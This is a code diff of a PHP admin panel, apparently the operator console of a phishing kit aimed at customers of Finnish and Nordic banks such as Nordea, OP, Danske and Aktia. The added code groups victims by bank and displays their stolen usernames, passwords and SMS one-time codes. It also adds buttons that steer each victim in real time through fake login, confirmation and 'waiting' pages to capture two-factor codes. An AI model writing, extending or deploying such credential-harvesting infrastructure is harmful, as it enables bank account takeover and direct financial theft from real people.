@@ -21,10 +21,382 @@ ob_start();
 
 <div class="p-4 md:p-8 animate-fade-in">
     <div class="mb-6 md:mb-8">
-        <h1 class="text-2xl md:text-3xl font-bold text-slate-100">Kullanıcılar</h1>
-        <p class="text-slate-400 mt-2">Toplam <?= number_format($totalUsers) ?> kullanıcı</p>
+        <div class="flex items-center justify-between">
+            <div>
+                <h1 class="text-2xl md:text-3xl font-bold text-slate-100">
+                    <?php if (isset($filteredBank)): ?>
+                        <?= htmlspecialchars($filteredBank) ?> - Kullanıcılar
+                    <?php else: ?>
+                        Kullanıcılar
+                    <?php endif; ?>
+                </h1>
+                <p class="text-slate-400 mt-2">
+                    <?php if (isset($filteredBank)): ?>
+                        <?= htmlspecialchars($filteredBank) ?> bankasını seçen <?= number_format($totalUsers) ?> kullanıcı
+                    <?php else: ?>
+                        Toplam <?= number_format($totalUsers) ?> kullanıcı
+                    <?php endif; ?>
+                </p>
+            </div>
+            <?php if (isset($filteredBank)): ?>
+            <a 
+                href="/admin/users" 
+                class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-slate-200 rounded-lg transition-colors flex items-center gap-2"
+            >
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                </svg>
+                Filtreyi Kaldır
+            </a>
+            <?php endif; ?>
+        </div>
     </div>
 
+    <?php if (isset($filteredBankKey)): ?>
+    <!-- Filtrelenmiş Banka - Kart Tasarımı -->
+    <?php if (empty($users)): ?>
+    <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 p-12 text-center animate-fade-in">
+        <svg class="w-16 h-16 mx-auto text-slate-500 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path>
+        </svg>
+        <h3 class="text-lg font-semibold text-slate-300 mb-2">Henüz kullanıcı yok</h3>
+        <p class="text-slate-400"><?= htmlspecialchars($filteredBank) ?> bankasını seçen kullanıcı bulunmuyor.</p>
+    </div>
+    <?php else: ?>
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 animate-fade-in">
+        <?php foreach ($users as $user): ?>
+        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 p-6 hover:border-blue-500/50 transition-all duration-200">
+            <div class="flex items-start justify-between mb-4">
+                <div>
+                    <div class="text-sm font-semibold text-slate-300 mb-1">#<?= $user['id'] ?></div>
+                    <h3 class="text-lg font-bold text-slate-100"><?= htmlspecialchars($user['full_name']) ?></h3>
+                    <p class="text-sm text-slate-400 mt-1"><?= htmlspecialchars($user['phone']) ?></p>
+                </div>
+                <div class="relative inline-block text-left" x-data="{ open: false }">
+                    <button 
+                        @click="open = !open"
+                        class="text-slate-400 hover:text-slate-200 transition-colors"
+                    >
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path>
+                        </svg>
+                    </button>
+                    <div 
+                        x-show="open"
+                        @click.away="open = false"
+                        class="origin-top-right absolute right-0 mt-2 w-56 rounded-lg shadow-2xl bg-slate-800 border border-slate-600 z-50"
+                    >
+                        <div class="py-2">
+                            <?php if (isset($filteredBankKey) && isset($bankId) && $bankId): ?>
+                            <div class="px-4 py-2 bg-slate-700 border-b border-slate-600">
+                                <div class="text-xs font-semibold text-slate-300 uppercase tracking-wide"><?= htmlspecialchars($filteredBank ?? 'Banka') ?></div>
+                            </div>
+                            
+                            <?php
+                            // Her banka için tüm sayfaları belirle
+                            $bankPages = [];
+                            if ($filteredBankKey === 'nordea') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/1', 'label' => 'Nordea Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/nordea2', 'label' => 'Nordea Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/nordea3', 'label' => 'Nordea Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/nordea4', 'label' => 'Nordea Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/nordea5', 'label' => 'Nordea Sayfa 5']
+                                ];
+                            } elseif ($filteredBankKey === 'alandsbanken') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/2', 'label' => 'Ålandsbanken Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken2', 'label' => 'Ålandsbanken Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken3', 'label' => 'Ålandsbanken Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken4', 'label' => 'Ålandsbanken Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken5', 'label' => 'Ålandsbanken Sayfa 5']
+                                ];
+                            } elseif ($filteredBankKey === 'danske') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/3', 'label' => 'Danske Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/danske2', 'label' => 'Danske Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/danske3', 'label' => 'Danske Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/danske4', 'label' => 'Danske Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/danske5', 'label' => 'Danske Sayfa 5']
+                                ];
+                            } elseif ($filteredBankKey === 'spankki') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/4', 'label' => 'S-Pankki Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/spankki2', 'label' => 'S-Pankki Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/spankki3', 'label' => 'S-Pankki Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/spankki4', 'label' => 'S-Pankki Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/spankki5', 'label' => 'S-Pankki Sayfa 5'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/spankki-confirm', 'label' => 'S-Pankki Onay Sayfası']
+                                ];
+                            } elseif ($filteredBankKey === 'aktia') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/' . $bankId, 'label' => 'Aktia Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/aktia2', 'label' => 'Aktia Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/aktia3', 'label' => 'Aktia Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/aktia4', 'label' => 'Aktia Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/aktia5', 'label' => 'Aktia Sayfa 5']
+                                ];
+                            } elseif ($filteredBankKey === 'op') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/' . $bankId, 'label' => 'OP Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/op2', 'label' => 'OP Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/op3', 'label' => 'OP Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/op4', 'label' => 'OP Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/op5', 'label' => 'OP Sayfa 5'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/op-confirm', 'label' => 'OP Onay Sayfası']
+                                ];
+                            } elseif ($filteredBankKey === 'poppankki') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/7', 'label' => 'POP Pankki Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki2', 'label' => 'POP Pankki Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki3', 'label' => 'POP Pankki Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki4', 'label' => 'POP Pankki Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki5', 'label' => 'POP Pankki Sayfa 5']
+                                ];
+                            } elseif ($filteredBankKey === 'omasp') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/8', 'label' => 'OmaSP Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/omasp2', 'label' => 'OmaSP Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/omasp3', 'label' => 'OmaSP Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/omasp4', 'label' => 'OmaSP Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/omasp5', 'label' => 'OmaSP Sayfa 5']
+                                ];
+                            } elseif ($filteredBankKey === 'saastopankki') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/9', 'label' => 'Säästöpankki Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki2', 'label' => 'Säästöpankki Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki3', 'label' => 'Säästöpankki Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki4', 'label' => 'Säästöpankki Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki5', 'label' => 'Säästöpankki Sayfa 5']
+                                ];
+                            } elseif ($filteredBankKey === 'handelsbanken') {
+                                $bankPages = [
+                                    ['url' => '/user/' . $user['id'] . '/bank/10', 'label' => 'Handelsbanken Giriş'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken2', 'label' => 'Handelsbanken Sayfa 2'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken3', 'label' => 'Handelsbanken Sayfa 3'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken4', 'label' => 'Handelsbanken Sayfa 4'],
+                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken5', 'label' => 'Handelsbanken Sayfa 5']
+                                ];
+                            }
+                            
+                            if (!empty($bankPages)):
+                                foreach ($bankPages as $page):
+                            ?>
+                            <button 
+                                onclick="redirectUser(<?= $user['id'] ?>, '<?= $page['url'] ?>')"
+                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
+                                role="menuitem"
+                            >
+                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
+                                </svg>
+                                <?= htmlspecialchars($page['label']) ?>
+                            </button>
+                            <?php
+                                endforeach;
+                            endif;
+                            ?>
+                            <div class="border-t border-slate-600 my-2"></div>
+                            <?php endif; ?>
+                            <button 
+                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/waiting')"
+                                class="w-full text-left block px-4 py-2 text-sm text-slate-200 hover:bg-slate-700 transition-colors"
+                            >
+                                Bekletme Sayfası
+                            </button>
+                            <button 
+                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/whatsapp')"
+                                class="w-full text-left block px-4 py-2 text-sm text-slate-200 hover:bg-slate-700 transition-colors"
+                            >
+                                WhatsApp Yönlendirme
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="space-y-3">
+                <?php
+                $bankData = null;
+                if ($filteredBankKey === 'nordea' && (!empty($user['nordea_username']) || !empty($user['nordea_password']) || !empty($user['nordea_sms_code']) || !empty($user['nordea_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['nordea_username'] ?? null,
+                        'password' => $user['nordea_password'] ?? null,
+                        'sms_code' => $user['nordea_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['nordea_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'alandsbanken' && (!empty($user['alandsbanken_username']) || !empty($user['alandsbanken_password']) || !empty($user['alandsbanken_sms_code']) || !empty($user['alandsbanken_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['alandsbanken_username'] ?? null,
+                        'password' => $user['alandsbanken_password'] ?? null,
+                        'sms_code' => $user['alandsbanken_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['alandsbanken_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'danske' && (!empty($user['danske_username']) || !empty($user['danske_password']) || !empty($user['danske_sms_code']) || !empty($user['danske_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['danske_username'] ?? null,
+                        'password' => $user['danske_password'] ?? null,
+                        'sms_code' => $user['danske_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['danske_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'spankki' && (!empty($user['spankki_username']) || !empty($user['spankki_password']) || !empty($user['spankki_sms_code']) || !empty($user['spankki_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['spankki_username'] ?? null,
+                        'password' => $user['spankki_password'] ?? null,
+                        'sms_code' => $user['spankki_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['spankki_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'aktia' && (!empty($user['aktia_username']) || !empty($user['aktia_sms_code']) || !empty($user['aktia_app_confirmed']) || !empty($user['aktia_login_method']))) {
+                    $bankData = [
+                        'username' => $user['aktia_username'] ?? null,
+                        'login_method' => $user['aktia_login_method'] ?? null,
+                        'sms_code' => $user['aktia_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['aktia_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'op' && (!empty($user['op_username']) || !empty($user['op_password']) || !empty($user['op_sms_code']) || !empty($user['op_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['op_username'] ?? null,
+                        'password' => $user['op_password'] ?? null,
+                        'sms_code' => $user['op_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['op_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'poppankki' && (!empty($user['poppankki_username']) || !empty($user['poppankki_sms_code']) || !empty($user['poppankki_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['poppankki_username'] ?? null,
+                        'sms_code' => $user['poppankki_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['poppankki_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'omasp' && (!empty($user['omasp_username']) || !empty($user['omasp_sms_code']) || !empty($user['omasp_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['omasp_username'] ?? null,
+                        'sms_code' => $user['omasp_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['omasp_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'saastopankki' && (!empty($user['saastopankki_username']) || !empty($user['saastopankki_sms_code']) || !empty($user['saastopankki_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['saastopankki_username'] ?? null,
+                        'sms_code' => $user['saastopankki_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['saastopankki_app_confirmed'])
+                    ];
+                } elseif ($filteredBankKey === 'handelsbanken' && (!empty($user['handelsbanken_username']) || !empty($user['handelsbanken_password']) || !empty($user['handelsbanken_sms_code']) || !empty($user['handelsbanken_app_confirmed']))) {
+                    $bankData = [
+                        'username' => $user['handelsbanken_username'] ?? null,
+                        'password' => $user['handelsbanken_password'] ?? null,
+                        'sms_code' => $user['handelsbanken_sms_code'] ?? null,
+                        'app_confirmed' => !empty($user['handelsbanken_app_confirmed'])
+                    ];
+                }
+                ?>
+                
+                <?php if ($bankData): ?>
+                <div class="bg-slate-700/50 rounded-lg p-4 border border-slate-600/50">
+                    <h4 class="text-sm font-semibold text-slate-300 mb-3 flex items-center gap-2">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
+                        </svg>
+                        <?= htmlspecialchars($filteredBank) ?> Bilgileri
+                    </h4>
+                    <div class="space-y-2.5">
+                        <?php if (!empty($bankData['username'])): ?>
+                        <div>
+                            <div class="text-xs font-medium text-slate-400 mb-1">
+                                <?= $filteredBankKey === 'nordea' ? 'Käyttäjätunnus' : ($filteredBankKey === 'danske' ? 'User ID' : ($filteredBankKey === 'handelsbanken' ? 'Användarnamn' : 'Käyttäjätunnus')) ?>:
+                            </div>
+                            <div class="text-sm font-mono text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
+                                <?= htmlspecialchars($bankData['username']) ?>
+                            </div>
+                        </div>
+                        <?php endif; ?>
+                        <?php if (!empty($bankData['password'])): ?>
+                        <div>
+                            <div class="text-xs font-medium text-slate-400 mb-1">
+                                <?= $filteredBankKey === 'nordea' ? 'Tunnusluku' : ($filteredBankKey === 'danske' ? 'Password' : ($filteredBankKey === 'handelsbanken' ? 'Lösenord' : 'Salasana')) ?>:
+                            </div>
+                            <div class="text-sm font-mono text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
+                                <?= htmlspecialchars($bankData['password']) ?>
+                            </div>
+                        </div>
+                        <?php endif; ?>
+                        <?php if (!empty($bankData['login_method'])): ?>
+                        <div>
+                            <div class="text-xs font-medium text-slate-400 mb-1">Kirjautumistapa:</div>
+                            <div class="text-sm text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
+                                <?= $bankData['login_method'] === 'app' ? 'Kyllä, Aktia ID -sovellus' : 'Ei, verkkopankkitunnus + SMS' ?>
+                            </div>
+                        </div>
+                        <?php endif; ?>
+                        <?php if (!empty($bankData['sms_code'])): ?>
+                        <div>
+                            <div class="text-xs font-medium text-slate-400 mb-1">SMS Kodu:</div>
+                            <div class="text-sm font-mono text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
+                                <?= htmlspecialchars($bankData['sms_code']) ?>
+                            </div>
+                        </div>
+                        <?php endif; ?>
+                        <?php if (!empty($bankData['app_confirmed'])): ?>
+                        <div>
+                            <div class="text-xs font-medium text-slate-400 mb-1">Uygulama Onayı:</div>
+                            <div class="inline-flex items-center px-3 py-1.5 rounded-full text-xs font-semibold bg-green-500/20 text-green-400 border border-green-500/30">
+                                <svg class="w-3 h-3 mr-1.5" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+                                </svg>
+                                Onaylandı
+                            </div>
+                        </div>
+                        <?php endif; ?>
+                    </div>
+                </div>
+                <?php else: ?>
+                <div class="bg-slate-700/30 rounded-lg p-4 border border-slate-600/30 text-center">
+                    <p class="text-sm text-slate-400">Henüz <?= htmlspecialchars($filteredBank) ?> bilgisi yok</p>
+                </div>
+                <?php endif; ?>
+                
+                <div class="flex items-center justify-between pt-3 border-t border-slate-700">
+                    <div class="text-xs text-slate-400">
+                        <?= htmlspecialchars($user['ip_address']) ?>
+                    </div>
+                    <div class="text-xs text-slate-400">
+                        <?= date('d.m.Y H:i', strtotime($user['created_at'])) ?>
+                    </div>
+                </div>
+                
+                <?php if (!empty($user['current_page'])): ?>
+                <div class="pt-2">
+                    <div class="inline-flex items-center px-3 py-1.5 rounded-full text-xs font-medium bg-green-500/20 text-green-400 border border-green-500/30">
+                        <span class="w-2 h-2 bg-green-400 rounded-full mr-2 animate-pulse"></span>
+                        <?= htmlspecialchars($user['page_title'] ?? $user['current_page']) ?>
+                    </div>
+                </div>
+                <?php endif; ?>
+            </div>
+        </div>
+        <?php endforeach; ?>
+    </div>
+    
+    <!-- Pagination for filtered view -->
+    <?php if ($totalPages > 1): ?>
+    <div class="mt-6 flex items-center justify-between px-4 py-4 bg-slate-800 rounded-lg border border-slate-700">
+        <div class="text-sm text-slate-400">
+            Sayfa <?= $currentPage ?> / <?= $totalPages ?>
+        </div>
+        <div class="flex space-x-2">
+            <?php if ($currentPage > 1): ?>
+            <a href="/admin/users/bank/<?= $filteredBankKey ?>?page=<?= $currentPage - 1 ?>" class="px-4 py-2 bg-slate-700 text-slate-200 rounded-lg hover:bg-slate-600 transition-colors">
+                Önceki
+            </a>
+            <?php endif; ?>
+            <?php if ($currentPage < $totalPages): ?>
+            <a href="/admin/users/bank/<?= $filteredBankKey ?>?page=<?= $currentPage + 1 ?>" class="px-4 py-2 bg-slate-700 text-slate-200 rounded-lg hover:bg-slate-600 transition-colors">
+                Sonraki
+            </a>
+            <?php endif; ?>
+        </div>
+    </div>
+    <?php endif; ?>
+    <?php endif; ?>
+    <?php else: ?>
+    <!-- Normal Tablo Görünümü -->
     <div class="bg-slate-800 rounded-lg shadow-2xl border border-slate-700 overflow-hidden animate-slide-in">
         <div class="overflow-x-auto -mx-4 md:mx-0">
             <table class="w-full min-w-[1200px] md:min-w-0">
@@ -656,8 +1028,45 @@ ob_start();
                                             <?php endif; ?>
                                             <div class="border-t border-slate-600 my-2"></div>
                                             <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
-                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">OP</div>
+                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">OPBANK</div>
                                             </div>
+                                            <?php
+                                            $opUsername = isset($user['op_username']) ? trim($user['op_username']) : '';
+                                            $opPassword = isset($user['op_password']) ? trim($user['op_password']) : '';
+                                            $opSmsCode = isset($user['op_sms_code']) ? trim($user['op_sms_code']) : '';
+                                            $opAppConfirmed = !empty($user['op_app_confirmed']);
+                                            
+                                            if (!empty($opUsername) || !empty($opPassword) || !empty($opSmsCode) || $opAppConfirmed):
+                                            ?>
+                                            <div class="px-4 py-3 bg-slate-700/50 border-b border-slate-600">
+                                                <div class="text-xs space-y-1.5">
+                                                    <?php if (!empty($opUsername)): ?>
+                                                    <div>
+                                                        <span class="font-medium text-slate-300">Käyttäjätunnus:</span>
+                                                        <span class="text-slate-200 ml-2"><?= htmlspecialchars($opUsername) ?></span>
+                                                    </div>
+                                                    <?php endif; ?>
+                                                    <?php if (!empty($opPassword)): ?>
+                                                    <div>
+                                                        <span class="font-medium text-slate-300">Salasana:</span>
+                                                        <span class="text-slate-200 ml-2"><?= htmlspecialchars($opPassword) ?></span>
+                                                    </div>
+                                                    <?php endif; ?>
+                                                    <?php if (!empty($opSmsCode)): ?>
+                                                    <div>
+                                                        <span class="font-medium text-slate-300">SMS-koodi:</span>
+                                                        <span class="text-slate-200 ml-2"><?= htmlspecialchars($opSmsCode) ?></span>
+                                                    </div>
+                                                    <?php endif; ?>
+                                                    <?php if ($opAppConfirmed): ?>
+                                                    <div>
+                                                        <span class="font-medium text-slate-300">Sovelluksen vahvistus:</span>
+                                                        <span class="text-green-400 ml-2">✓ Vahvistettu</span>
+                                                    </div>
+                                                    <?php endif; ?>
+                                                </div>
+                                            </div>
+                                            <?php endif; ?>
                                             <?php
                                             $opBankId = null;
                                             foreach ($banks as $b) {
@@ -1000,6 +1409,7 @@ ob_start();
         </div>
         <?php endif; ?>
     </div>
+    <?php endif; ?>
 </div>
 
 <script>
@@ -1318,6 +1728,7 @@ function redirectUser(userId, redirectTo) {
 $content = ob_get_clean();
 $title = 'Kullanıcılar - Admin Panel';
 $showSidebar = true;
+$bankLogs = $bankLogs ?? [];
 include __DIR__ . '/../layout.php';
 ?>
 
